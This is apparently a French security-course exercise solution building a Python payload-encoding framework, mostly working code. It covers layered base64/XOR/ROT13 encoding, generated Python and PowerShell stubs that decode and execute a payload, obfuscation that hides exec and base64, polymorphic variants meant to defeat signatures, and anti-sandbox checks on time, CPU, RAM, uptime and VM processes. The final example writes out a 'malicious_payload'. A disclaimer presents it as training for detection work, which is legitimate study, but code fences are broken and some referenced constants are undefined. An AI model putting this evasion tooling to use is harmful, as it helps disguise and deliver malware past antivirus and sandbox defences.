SOLUTION EXERCICE 23: PAYLOAD ENCODER
=====================================

AVERTISSEMENT: Solution strictement éducative pour comprendre les techniques
d'évasion et améliorer la détection de malware.

================================
DÉFI 1: ENCODEURS BASIQUES
================================

class BasicEncoders:
```python
    @staticmethod
    def encode_base64(data: Union[str, bytes]) -> str:
        if isinstance(data, str):
            data = data.encode('utf-8')
        return base64.b64encode(data).decode('ascii')

    @staticmethod
    def decode_base64(encoded: str) -> bytes:
        # Ajouter padding si nécessaire
        padding = 4 - (len(encoded) % 4)
        if padding and padding != 4:
            encoded += '=' * padding
        return base64.b64decode(encoded)

    @staticmethod
    def encode_hex(data: Union[str, bytes]) -> str:
        if isinstance(data, str):
            data = data.encode('utf-8')
        return binascii.hexlify(data).decode('ascii')

    @staticmethod
    def decode_hex(encoded: str) -> bytes:
        return binascii.unhexlify(encoded)

    @staticmethod
    def encode_rot13(data: str) -> str:
        result = []
        for char in data:
            if 'a' <= char <= 'z':
                result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
            elif 'A' <= char <= 'Z':
                result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
            else:
                result.append(char)
        return ''.join(result)

    @staticmethod
    def decode_rot13(encoded: str) -> str:
        # ROT13 est son propre inverse
        return BasicEncoders.encode_rot13(encoded)

    @staticmethod
    def encode_url(data: str) -> str:
        from urllib.parse import quote
        return quote(data, safe='')

    @staticmethod
    def decode_url(encoded: str) -> str:
        from urllib.parse import unquote
        return unquote(encoded)

```
Test:
payload = "Hello World!"
b64 = BasicEncoders.encode_base64(payload)
```python
print(f"Base64: {b64}")
print(f"Decoded: {BasicEncoders.decode_base64(b64).decode()}")

```
hex_encoded = BasicEncoders.encode_hex(payload)
```python
print(f"Hex: {hex_encoded}")

```
rot13 = BasicEncoders.encode_rot13(payload)
```python
print(f"ROT13: {rot13}")

```
================================
DÉFI 2: ENCODEUR XOR
================================

```python
import secrets

class XOREncoder:
    @staticmethod
    def generate_random_key(length: int = 16) -> bytes:
        return secrets.token_bytes(length)

    @staticmethod
    def xor_encode(data: bytes, key: bytes) -> bytes:
        # XOR byte par byte avec répétition de la clé
        result = bytearray()
        key_len = len(key)

        for i, byte in enumerate(data):
            result.append(byte ^ key[i % key_len])

        return bytes(result)

    @staticmethod
    def xor_decode(encoded: bytes, key: bytes) -> bytes:
        # XOR est son propre inverse
        return XOREncoder.xor_encode(encoded, key)

    @staticmethod
    def encode_with_metadata(data: Union[str, bytes], key: Optional[bytes] = None) -> Dict:
        # Convertir en bytes si nécessaire
        if isinstance(data, str):
            data = data.encode('utf-8')

        # Générer clé si non fournie
        if key is None:
            key = XOREncoder.generate_random_key()

        # Encoder
        encoded = XOREncoder.xor_encode(data, key)

        # Retourner avec métadonnées
        return {
            'encoded': base64.b64encode(encoded).decode(),  # Base64 pour transport
            'key': base64.b64encode(key).decode(),
            'key_length': len(key),
            'original_size': len(data),
            'encoded_size': len(encoded),
            'algorithm': 'xor'
        }

```
Utilisation:
payload = b"Sensitive data here"
result = XOREncoder.encode_with_metadata(payload)

```python
print(f"Encoded: {result['encoded']}")
print(f"Key: {result['key']}")

```
# Décodage
encoded_bytes = base64.b64decode(result['encoded'])
key_bytes = base64.b64decode(result['key'])
decoded = XOREncoder.xor_decode(encoded_bytes, key_bytes)
```python
print(f"Decoded: {decoded.decode()}")

```
================================
DÉFI 3: ENCODAGE MULTI-COUCHES
================================

```python
class MultiLayerEncoder:
    def __init__(self):
        self.layers = []
        self.xor_keys = {}

    def add_layer(self, encoder_type: str, **kwargs):
        if encoder_type not in self.AVAILABLE_ENCODERS:
            raise ValueError(f"Encodeur inconnu: {encoder_type}")

        self.layers.append({
            'type': encoder_type,
            'params': kwargs
        })

        # Stocker clé XOR si fournie
        if encoder_type == 'xor' and 'key' in kwargs:
            self.xor_keys[len(self.layers) - 1] = kwargs['key']

    def encode(self, data: Union[str, bytes]) -> Tuple[bytes, Dict]:
        # Convertir en bytes
        if isinstance(data, str):
            current_data = data.encode('utf-8')
        else:
            current_data = data

        original_size = len(current_data)
        metadata = {
            'layers': [],
            'original_size': original_size,
            'timestamp': datetime.now().isoformat()
        }

        # Appliquer chaque couche
        for i, layer in enumerate(self.layers):
            encoder_type = layer['type']
            params = layer['params']

            if encoder_type == 'base64':
                current_data = BasicEncoders.encode_base64(current_data).encode()

            elif encoder_type == 'hex':
                current_data = BasicEncoders.encode_hex(current_data).encode()

            elif encoder_type == 'rot13':
                # ROT13 nécessite string
                current_data = BasicEncoders.encode_rot13(current_data.decode()).encode()

            elif encoder_type == 'xor':
                key = params.get('key')
                if key is None:
                    key = XOREncoder.generate_random_key()

                if isinstance(key, str):
                    key = key.encode()

                current_data = XOREncoder.xor_encode(current_data, key)

                # Stocker la clé dans métadonnées
                metadata['layers'].append({
                    'type': 'xor',
                    'key': base64.b64encode(key).decode()
                })
                continue

            metadata['layers'].append({'type': encoder_type})

        metadata['encoded_size'] = len(current_data)
        return current_data, metadata

    def decode(self, encoded_data: bytes, metadata: Dict) -> bytes:
        current_data = encoded_data

        # Appliquer decoders en ordre INVERSE
        for layer in reversed(metadata['layers']):
            encoder_type = layer['type']

            if encoder_type == 'base64':
                current_data = BasicEncoders.decode_base64(current_data.decode())

            elif encoder_type == 'hex':
                current_data = BasicEncoders.decode_hex(current_data.decode())

            elif encoder_type == 'rot13':
                current_data = BasicEncoders.decode_rot13(current_data.decode()).encode()

            elif encoder_type == 'xor':
                key = base64.b64decode(layer['key'])
                current_data = XOREncoder.xor_decode(current_data, key)

        return current_data

```
Utilisation:
encoder = MultiLayerEncoder()
encoder.add_layer('xor', key='secret123')
encoder.add_layer('base64')
encoder.add_layer('rot13')

payload = "print('Encoded payload')"
encoded, metadata = encoder.encode(payload)

```python
print(f"Original: {payload}")
print(f"Encoded: {encoded[:50]}...")
print(f"Layers: {[l['type'] for l in metadata['layers']]}")

```
# Décoder
decoded = encoder.decode(encoded, metadata)
```python
print(f"Decoded: {decoded.decode()}")

```
================================
DÉFI 4: GÉNÉRATEUR DE DECODER STUB
================================

```python
class DecoderStubGenerator:
    @staticmethod
    def generate_python_decoder(metadata: Dict, encoded_payload: bytes) -> str:
        # Template de decoder
        decoder_template = '''#!/usr/bin/env python3
import base64

```
# Payload encodé
PAYLOAD = """{payload}"""

# Métadonnées de décodage
LAYERS = {layers}

```python
def decode_layer(data, layer):
    """Décode une couche."""
    layer_type = layer['type']

    if layer_type == 'base64':
        return base64.b64decode(data)

    elif layer_type == 'hex':
        import binascii
        return binascii.unhexlify(data)

    elif layer_type == 'rot13':
        result = []
        for char in data.decode():
            if 'a' <= char <= 'z':
                result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
            elif 'A' <= char <= 'Z':
                result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
            else:
                result.append(char)
        return ''.join(result).encode()

    elif layer_type == 'xor':
        key = base64.b64decode(layer['key'])
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ key[i % len(key)])
        return bytes(result)

    return data

```
# Décoder le payload
current = base64.b64decode(PAYLOAD)
```python
for layer in reversed(LAYERS):
    current = decode_layer(current, layer)

```
# Exécuter
exec(current.decode())
'''

```python
        # Encoder le payload en Base64 pour inclusion dans le code
        payload_b64 = base64.b64encode(encoded_payload).decode()

        # Générer le code
        code = decoder_template.format(
            payload=payload_b64,
            layers=json.dumps(metadata['layers'], indent=4)
        )

        return code

    @staticmethod
    def generate_python_oneliner(metadata: Dict, encoded_payload: bytes) -> str:
        # One-liner compact
        # Pour simplicité, on assume Base64->XOR seulement

        if len(metadata['layers']) == 2 and \
           metadata['layers'][0]['type'] == 'xor' and \
           metadata['layers'][1]['type'] == 'base64':

            xor_key = metadata['layers'][0]['key']
            payload_b64 = base64.b64encode(encoded_payload).decode()

            oneliner = f"exec(bytes([b^k[i%len(k)] for i,b in enumerate(__import__('base64').b64decode('{payload_b64}'))] for k in [__import__('base64').b64decode('{xor_key}')])[0])"

            return oneliner

        # Fallback: utiliser base64 simple
        payload_b64 = base64.b64encode(encoded_payload).decode()
        return f"exec(__import__('base64').b64decode('{payload_b64}'))"

    @staticmethod
    def generate_powershell_decoder(metadata: Dict, encoded_payload: bytes) -> str:
        # Template PowerShell
        ps_template = '''# Decoder PowerShell
```
$payload = "{payload}"
$key = "{key}"

# Décoder Base64
$encBytes = [System.Convert]::FromBase64String($payload)

# Décoder XOR
$keyBytes = [System.Convert]::FromBase64String($key)
$decoded = New-Object Byte[] $encBytes.Length

```python
for ($i = 0; $i -lt $encBytes.Length; $i++) {{
    $decoded[$i] = $encBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
```
}}

# Convertir en string et exécuter
$script = [System.Text.Encoding]::UTF8.GetString($decoded)
Invoke-Expression $script
'''

```python
        # Simplification: assume XOR + Base64
        payload_b64 = base64.b64encode(encoded_payload).decode()
        key_b64 = metadata['layers'][0].get('key', base64.b64encode(b'default').decode())

        code = ps_template.format(
            payload=payload_b64,
            key=key_b64
        )

        return code

```
================================
DÉFI 5: OBFUSCATION DE DECODER
================================

```python
class DecoderObfuscator:
    @staticmethod
    def randomize_variable_names(code: str) -> str:
        # Liste de variables communes à remplacer
        variables = ['payload', 'key', 'data', 'result', 'layer', 'current', 'decoded']

        # Générer remplacements aléatoires
        replacements = {}
        for var in variables:
            # Nom aléatoire de 8 caractères
            random_name = ''.join(random.choices(string.ascii_lowercase, k=8))
            replacements[var] = random_name

        # Remplacer dans le code (attention aux mots complets)
        import re
        obfuscated = code
        for old, new in replacements.items():
            # Remplacer seulement les mots entiers
            pattern = r'\b' + old + r'\b'
            obfuscated = re.sub(pattern, new, obfuscated)

        return obfuscated

    @staticmethod
    def insert_junk_code(code: str) -> str:
        # Lignes de junk code valides mais inutiles
        junk_lines = [
            "import sys  # System module",
            "import os  # OS module",
            "_ = 1 + 1  # Calculation",
            "__ = len('test')  # Length",
            "___ = True and False  # Boolean",
            "x = [i for i in range(10)]  # List comp",
        ]

        # Insérer aléatoirement dans le code
        lines = code.split('\n')
        result_lines = []

        for line in lines:
            result_lines.append(line)

            # 30% de chance d'insérer junk après cette ligne
            if random.random() < 0.3:
                junk = random.choice(junk_lines)
                result_lines.append(junk)

        return '\n'.join(result_lines)

    @staticmethod
    def split_strings(code: str) -> str:
        # Fragmenter strings suspectes
        import re

        def split_string_match(match):
            string_content = match.group(1)
            if len(string_content) < 4:
                return match.group(0)

            # Splitter au milieu
            mid = len(string_content) // 2
            part1 = string_content[:mid]
            part2 = string_content[mid:]

            return f"'{part1}' + '{part2}'"

        # Remplacer strings entre quotes simples
        obfuscated = re.sub(r"'([^']+)'", split_string_match, code)

        return obfuscated

    @staticmethod
    def use_indirection(code: str) -> str:
        # Remplacer exec par indirection
        code = code.replace(
            'exec(',
            'getattr(__builtins__, "ex" + "ec")('
        )

        # Remplacer eval
        code = code.replace(
            'eval(',
            'getattr(__builtins__, "ev" + "al")('
        )

        # Masquer import base64
        code = code.replace(
            'import base64',
            'base64 = __import__("ba" + "se64")'
        )

        return code

    @staticmethod
    def obfuscate_full(code: str) -> str:
        # Appliquer toutes les techniques
        obfuscated = code

        obfuscated = DecoderObfuscator.randomize_variable_names(obfuscated)
        obfuscated = DecoderObfuscator.split_strings(obfuscated)
        obfuscated = DecoderObfuscator.use_indirection(obfuscated)
        obfuscated = DecoderObfuscator.insert_junk_code(obfuscated)

        return obfuscated

```
Exemple:
original_decoder = '''
import base64
payload = "SGVsbG8="
decoded = base64.b64decode(payload)
exec(decoded)
'''

obfuscated = DecoderObfuscator.obfuscate_full(original_decoder)
```python
print("Obfuscated:")
print(obfuscated)

```
================================
DÉFI 6: ENCODAGE POLYMORPHIQUE
================================

```python
class PolymorphicEncoder:
    @staticmethod
    def randomize_layer_order(layers: List[str]) -> List[str]:
        # Copier et randomiser
        randomized = layers.copy()
        random.shuffle(randomized)
        return randomized

    @staticmethod
    def add_random_padding(data: bytes) -> Tuple[bytes, int]:
        # Générer 10-50 bytes de padding aléatoire
        padding_size = random.randint(10, 50)
        padding = secrets.token_bytes(padding_size)

        # Ajouter au début
        padded = padding + data

        return padded, padding_size

    @staticmethod
    def generate_unique_encoding(payload: Union[str, bytes]) -> Dict:
        if isinstance(payload, str):
            payload = payload.encode()

        # Choisir 2-4 couches aléatoires
        available_layers = ['base64', 'hex', 'rot13', 'xor']
        num_layers = random.randint(2, 4)
        selected_layers = random.sample(available_layers, num_layers)

        # Randomiser l'ordre
        random.shuffle(selected_layers)

        # Créer encoder
        encoder = MultiLayerEncoder()

        for layer in selected_layers:
            if layer == 'xor':
                # Générer clé aléatoire
                random_key = XOREncoder.generate_random_key(random.randint(8, 32))
                encoder.add_layer('xor', key=random_key)
            else:
                encoder.add_layer(layer)

        # Encoder
        encoded, metadata = encoder.encode(payload)

        # Ajouter padding
        padded, padding_size = PolymorphicEncoder.add_random_padding(encoded)

        # Calculer signature unique
        signature = hashlib.sha256(padded).hexdigest()

        return {
            'encoded': padded,
            'metadata': metadata,
            'padding_size': padding_size,
            'signature': signature,
            'layers': selected_layers
        }

    @staticmethod
    def generate_multiple_variants(payload: Union[str, bytes], count: int = 5) -> List[Dict]:
        variants = []

        for _ in range(count):
            variant = PolymorphicEncoder.generate_unique_encoding(payload)
            variants.append(variant)

        # Vérifier que toutes les signatures sont différentes
        signatures = [v['signature'] for v in variants]
        unique_signatures = len(set(signatures))

        print(f"Généré {count} variantes, {unique_signatures} signatures uniques")

        return variants

```
Utilisation:
payload = "print('Polymorphic payload')"
variants = PolymorphicEncoder.generate_multiple_variants(payload, count=3)

```python
for i, variant in enumerate(variants):
    print(f"\nVariante {i+1}:")
    print(f"  Layers: {variant['layers']}")
    print(f"  Signature: {variant['signature'][:16]}...")
    print(f"  Size: {len(variant['encoded'])} bytes")

```
================================
DÉFI 7: TECHNIQUES ANTI-AV
================================

```python
class AntiAVTechniques:
    @staticmethod
    def fragment_payload(payload: bytes, chunk_size: int = 64) -> List[bytes]:
        chunks = []
        for i in range(0, len(payload), chunk_size):
            chunks.append(payload[i:i+chunk_size])
        return chunks

    @staticmethod
    def generate_reassembly_code(chunks: List[bytes]) -> str:
        # Encoder chaque chunk
        encoded_chunks = [base64.b64encode(chunk).decode() for chunk in chunks]

        # Générer code de réassemblage
        code = "import base64\n"
        code += "chunks = [\n"

        for chunk in encoded_chunks:
            code += f"    '{chunk}',\n"

        code += "]\n"
        code += "payload = b''.join([base64.b64decode(c) for c in chunks])\n"
        code += "exec(payload)\n"

        return code

    @staticmethod
    def add_time_delay(decoder_code: str, delay_seconds: int = 5) -> str:
        delay_code = f"""
import time
import datetime

```
# Anti-sandbox: délai avant exécution
time.sleep({delay_seconds})

# Vérifier que c'est vraiment {delay_seconds}s plus tard
start = datetime.datetime.now()
time.sleep(1)
elapsed = (datetime.datetime.now() - start).total_seconds()
```python
if elapsed < 0.5:  # Sandbox accélère le temps
    exit(0)

```
"""
```python
        return delay_code + decoder_code

    @staticmethod
    def add_environment_checks(decoder_code: str) -> str:
        env_checks = """
import os
import platform
import psutil  # Nécessite installation

```
# Check 1: Nombre de CPUs (sandbox souvent < 2)
```python
if psutil.cpu_count() < 2:
    exit(0)

```
# Check 2: RAM (sandbox souvent < 4GB)
```python
if psutil.virtual_memory().total < 4 * 1024 * 1024 * 1024:
    exit(0)

```
# Check 3: Uptime (sandbox souvent fraîchement démarrée)
import datetime
boot_time = datetime.datetime.fromtimestamp(psutil.boot_time())
uptime = (datetime.datetime.now() - boot_time).total_seconds()
```python
if uptime < 600:  # < 10 minutes
    exit(0)

```
# Check 4: Processus VM suspects
vm_processes = ['vmtoolsd', 'vboxservice', 'qemu-ga']
running = [p.name().lower() for p in psutil.process_iter(['name'])]
```python
for vm_proc in vm_processes:
    if vm_proc in running:
        exit(0)

```
"""
```python
        return env_checks + decoder_code

    @staticmethod
    def encrypt_payload(payload: bytes, password: str) -> Tuple[bytes, bytes]:
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.backends import default_backend
        from cryptography.fernet import Fernet

        # Générer salt
        salt = secrets.token_bytes(16)

        # Dériver clé depuis password
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )

        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))

        # Chiffrer
        f = Fernet(key)
        encrypted = f.encrypt(payload)

        return encrypted, salt

```
Exemple complet:
# Fragmenter payload
payload = b"print('Hidden payload')" * 10
chunks = AntiAVTechniques.fragment_payload(payload, chunk_size=32)
reassembly_code = AntiAVTechniques.generate_reassembly_code(chunks)

# Ajouter délai
with_delay = AntiAVTechniques.add_time_delay(reassembly_code, delay_seconds=3)

# Ajouter env checks
final_code = AntiAVTechniques.add_environment_checks(with_delay)

```python
print(final_code)

```
================================
DÉFI 8: FRAMEWORK COMPLET
================================

```python
class EncodingFramework:
    def __init__(self, profile: str = 'balanced'):
        if profile not in self.PROFILES:
            raise ValueError(f"Profil inconnu: {profile}")

        self.profile = profile
        self.config = self.PROFILES[profile]

    def encode_payload(self, payload: Union[str, bytes], payload_type: str = 'python') -> Dict:
        if isinstance(payload, str):
            payload = payload.encode()

        # Créer encoder avec les couches du profil
        encoder = MultiLayerEncoder()

        for layer in self.config['layers']:
            if layer == 'xor':
                key = XOREncoder.generate_random_key()
                encoder.add_layer('xor', key=key)
            else:
                encoder.add_layer(layer)

        # Encoder
        encoded, metadata = encoder.encode(payload)

        # Appliquer polymorphisme si activé
        if self.config['polymorphic']:
            poly_result = PolymorphicEncoder.generate_unique_encoding(payload)
            encoded = poly_result['encoded']
            metadata = poly_result['metadata']

        # Générer decoder
        decoder_code = DecoderStubGenerator.generate_python_decoder(metadata, encoded)

        # Obfusquer selon niveau
        obf_level = self.config['obfuscation_level']
        if obf_level == 'low':
            decoder_code = DecoderObfuscator.randomize_variable_names(decoder_code)
        elif obf_level == 'medium':
            decoder_code = DecoderObfuscator.split_strings(decoder_code)
            decoder_code = DecoderObfuscator.randomize_variable_names(decoder_code)
        elif obf_level == 'high':
            decoder_code = DecoderObfuscator.obfuscate_full(decoder_code)

        # Appliquer techniques anti-AV
        for technique in self.config['anti_av']:
            if technique == 'delay':
                decoder_code = AntiAVTechniques.add_time_delay(decoder_code, 3)
            elif technique == 'env_check':
                decoder_code = AntiAVTechniques.add_environment_checks(decoder_code)
            elif technique == 'fragment':
                chunks = AntiAVTechniques.fragment_payload(payload)
                decoder_code = AntiAVTechniques.generate_reassembly_code(chunks)

        return {
            'encoded_payload': encoded,
            'decoder_code': decoder_code,
            'metadata': metadata,
            'profile': self.profile,
            'payload_type': payload_type,
            'original_size': len(payload),
            'encoded_size': len(encoded),
            'signature': hashlib.sha256(encoded).hexdigest()
        }

    def generate_report(self, encoding_result: Dict) -> str:
        report = f"""
```
RAPPORT D'ENCODAGE DE PAYLOAD
==============================

Profil utilisé: {encoding_result['profile']}
Type de payload: {encoding_result['payload_type']}

Tailles:
  - Original: {encoding_result['original_size']} bytes
  - Encodé: {encoding_result['encoded_size']} bytes
  - Ratio: {encoding_result['encoded_size'] / encoding_result['original_size']:.2f}x

Couches d'encodage appliquées:
"""

```python
        for i, layer in enumerate(encoding_result['metadata']['layers'], 1):
            report += f"  {i}. {layer['type']}\n"

        report += f"\nSignature SHA256: {encoding_result['signature']}\n"
        report += f"Timestamp: {encoding_result['metadata']['timestamp']}\n"

        return report

    def save_output(self, encoding_result: Dict, output_path: str):
        import os

        base_path = output_path.rsplit('.', 1)[0]

        # Sauvegarder payload encodé
        with open(f"{base_path}_encoded.bin", 'wb') as f:
            f.write(encoding_result['encoded_payload'])

        # Sauvegarder decoder
        with open(f"{base_path}_decoder.py", 'w') as f:
            f.write(encoding_result['decoder_code'])

        # Sauvegarder métadonnées
        with open(f"{base_path}_metadata.json", 'w') as f:
            # Convertir bytes en base64 pour JSON
            metadata = encoding_result['metadata'].copy()
            json.dump(metadata, f, indent=2)

        # Sauvegarder rapport
        report = self.generate_report(encoding_result)
        with open(f"{base_path}_report.txt", 'w') as f:
            f.write(report)

        print(f"[+] Fichiers sauvegardés:")
        print(f"    - {base_path}_encoded.bin")
        print(f"    - {base_path}_decoder.py")
        print(f"    - {base_path}_metadata.json")
        print(f"    - {base_path}_report.txt")

```
Utilisation complète:
# Créer framework avec profil aggressive
framework = EncodingFramework(profile='aggressive')

# Payload à encoder
payload = """
import socket
s = socket.socket()
# ... code ici ...
"""

# Encoder
result = framework.encode_payload(payload, payload_type='python')

# Afficher rapport
```python
print(framework.generate_report(result))

```
# Sauvegarder
framework.save_output(result, 'output/malicious_payload.py')

================================
CONCLUSION
================================

Ce framework complet d'encodage démontre:
- Encodage multi-couches flexible
- Génération automatique de decoders
- Obfuscation du code
- Polymorphisme pour évasion
- Techniques anti-AV et anti-sandbox
- Framework configurable avec profils

IMPORTANT:
Ces techniques sont pour COMPRENDRE comment les attaquants masquent leurs payloads.
Utilisez ces connaissances pour:
- Développer de meilleures signatures de détection
- Améliorer les sandboxes et analyseurs
- Former les équipes de sécurité
- Tester la robustesse de vos défenses

JAMAIS pour créer de vrais malwares ou attaquer des systèmes sans autorisation.
